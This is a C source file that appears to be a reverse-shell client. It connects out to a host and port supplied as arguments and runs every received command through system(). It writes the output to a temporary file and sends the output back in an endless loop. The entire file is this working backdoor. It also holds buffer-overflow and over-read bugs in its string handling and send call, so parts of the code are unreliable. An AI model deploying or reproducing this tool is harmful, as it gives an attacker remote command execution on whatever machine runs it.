#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>

#include <arpa/inet.h>


#define MAXDATASIZE 10000





int main(int argc, char *argv[]){
    int socfd, nbytes, rv;
    char buff[MAXDATASIZE], s[INET6_ADDRSTRLEN];
    struct addrinfo hints, *servinfo, *p;
    char Out[1000], Resp[1000];
    memset(&hints, 0, sizeof(hints));

    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    rv = getaddrinfo(argv[1], argv[2], &hints, &servinfo);
    if(rv!=0){
        fprintf(stderr, "\naddr info error: %s\n", gai_strerror(rv));
        return 1;
    }
    for(p = servinfo; p!=NULL; p=p->ai_next){
        if((socfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol))==-1){
            //perror("\nClient: socket");
            continue;
        }
        if(connect(socfd, p->ai_addr, p->ai_addrlen)==-1){
            close(socfd);
            //perror("\nConnected:");
            continue;
        }
        break;
    }
    if(p==NULL){
        //printf("\nConnection error");
        return 2;
    }

    while(1==1){
        if ((nbytes = recv(socfd, buff, MAXDATASIZE-1, 0)) == -1) {
            perror("recv");
            exit(1);
        }
        inet_ntop(p->ai_family, (&(((struct sockaddr_in*)((struct sockaddr*)p->ai_addr))->sin_addr)), s, sizeof(s));
        printf("\nMessage :%s", s);
        buff[nbytes] = '\0';

        printf("client: received '%s'\n",buff);
        char Command[1000];
        memset(Command, 0, sizeof(Command));
        strcat(Command, buff);
        strcat(Command, ">> rshout.txt");
        printf("\nComman: %s", Command);
        fclose(fopen("rshout.txt", "w"));
        system(Command);
        FILE *respfile;
        char OutFName[100];
        respfile = fopen("rshout.txt", "rw");
        memset(Resp, 0, sizeof(Resp));
        while(fgets(Out, 1000, respfile)){
            strcat(Resp, Out);
    
        }
        printf("%s", Resp);
        if (send(socfd, Resp,MAXDATASIZE, 0) == -1){
                //perror("\nError sending:");
                return -1;
        }
        fclose(respfile);
        remove("rshout.txt");    
               
        close(socfd);
        socfd = socket(p->ai_family, p->ai_socktype,p->ai_protocol);
        connect(socfd, p->ai_addr, p->ai_addrlen);
    }    
}
